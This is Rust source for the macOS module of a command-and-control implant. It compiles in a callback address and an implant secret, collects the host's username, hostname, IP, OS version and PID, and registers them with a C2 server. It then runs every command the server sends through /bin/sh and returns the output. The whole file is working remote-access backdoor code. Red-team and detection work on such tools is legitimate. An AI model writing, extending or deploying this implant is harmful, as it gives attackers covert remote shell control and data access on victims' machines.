use link_common::{dispatch::dispatch_common, RegisterRequest};
use std::env;
use std::process::Command;

const CALLBACK: &str = env!("CALLBACK");
const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USER").unwrap_or_else(|_| "unknown".into())
}

/// Uses `scutil --get ComputerName` which is the canonical macOS hostname.
fn hostname() -> String {
    Command::new("scutil")
        .args(["--get", "ComputerName"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| {
            std::fs::read_to_string("/etc/hostname")
                .unwrap_or_else(|_| "unknown".into())
                .trim()
                .to_string()
        })
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

/// Returns the macOS product name + version, e.g. "macOS 14.4.1".
fn platform_info() -> String {
    let name = Command::new("sw_vers")
        .arg("-productName")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "macOS".into());

    let version = Command::new("sw_vers")
        .arg("-productVersion")
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "unknown".into());

    format!("{} {}", name, version)
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    link_common::run_c2_loop(
        CALLBACK,
        IMPLANT_SECRET,
        RegisterRequest {
            link_username: username(),
            link_hostname: hostname(),
            internal_ip: local_ip(),
            external_ip: String::new(),
            platform: platform_info(),
            pid: std::process::id(),
        },
        dispatch,
    );
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    if let Some(output) = dispatch_common(raw) {
        return output;
    }
    let (cmd, args) = link_common::split_first(raw);
    match cmd {
        "whoami" => format!("{}@{}", username(), hostname()),
        "shell" => shell_exec(args),
        _ => shell_exec(raw),
    }
}

fn shell_exec(cmd: &str) -> String {
    match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}
